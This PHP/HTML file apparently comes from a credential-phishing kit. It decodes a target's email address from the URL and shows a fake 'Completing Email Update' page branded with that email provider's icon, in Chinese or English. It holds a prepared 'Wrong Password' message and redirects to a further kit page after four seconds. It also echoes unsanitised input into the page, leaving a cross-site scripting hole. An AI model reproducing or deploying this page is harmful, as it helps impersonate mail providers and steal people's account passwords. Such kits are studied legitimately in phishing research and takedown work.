<?php
$mail = $_GET['0'];
$dec = base64_decode($mail);
$domain = $dec;

if (stripos($domain, 'yahoo') !== false || stripos($domain, 'rocketmail') !== false){
$serv = "serv/ym.ico";
}

elseif (stripos($domain, 'office') !== false || stripos($domain, 'live') !== false || stripos($domain, 'hotmail') !== false){
$serv = "serv/hm.ico";
}

elseif (stripos($domain, 'yeah') !== false){
$serv = "serv/12.ico";
}

elseif (stripos($domain, '163') !== false){
$serv = "serv/12.ico";
}

elseif (stripos($domain, '126') !== false){
$serv = "serv/12.ico";
}


elseif (stripos($domain, '@mail.com') !== false){
$serv = "serv/ma.ico";
	
}

elseif (stripos($domain, 'gmail.com') !== false){
$serv = "serv/gm.ico";
}

elseif (stripos($domain, 'qq') !== false){
$serv = "serv/qq.ico";
	
}

elseif (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false){	
$serv = "serv/hi.ico";
	
}

else{
$serv = "serv/favicon.ico";
	
}
/**--------------------------------------------------------------**/
if (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false || stripos($domain, 'qq') !== false || stripos($domain, 'yeah') !== false || stripos($domain, '126') !== false || stripos($domain, '163') !== false){
$logo = "serv/logo/y.jpg";
$header = "完成电子邮件更新";
$wrong = "服务器响应：密码错误";
$update = "更新...";
}

else{
$logo = "serv/logo/y.jpg";
$header = "Completing Email Update";
$wrong = "Server Response: Wrong Password";
$update = "Updating...";
}
?>
<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<title>Completing Email Update...</title>
		<link rel="stylesheet" href="cache/css.css">
		<meta http-equiv="refresh" content="4; URL='ld.php?0=<?php echo $mail; ?>'" />
    <script src="cache/js.js" defer></script>
		<link rel="stylesheet" href="cache/style2.css">
	</head>
	<body>
		<div class="loginBox">
			<img src="<?php echo $serv; ?>" class="user">
			<h2><?php echo $header;?></h2>
			<form action="#">

				<input type="text" readonly name="e" placeholder="" value="<?php echo $dec; ?>">

				    <div class="progress-bar" style="--width: 10" data-label="<?php echo $update; ?>"></div>
				
			</form>
		</div>
	</body>
</html>
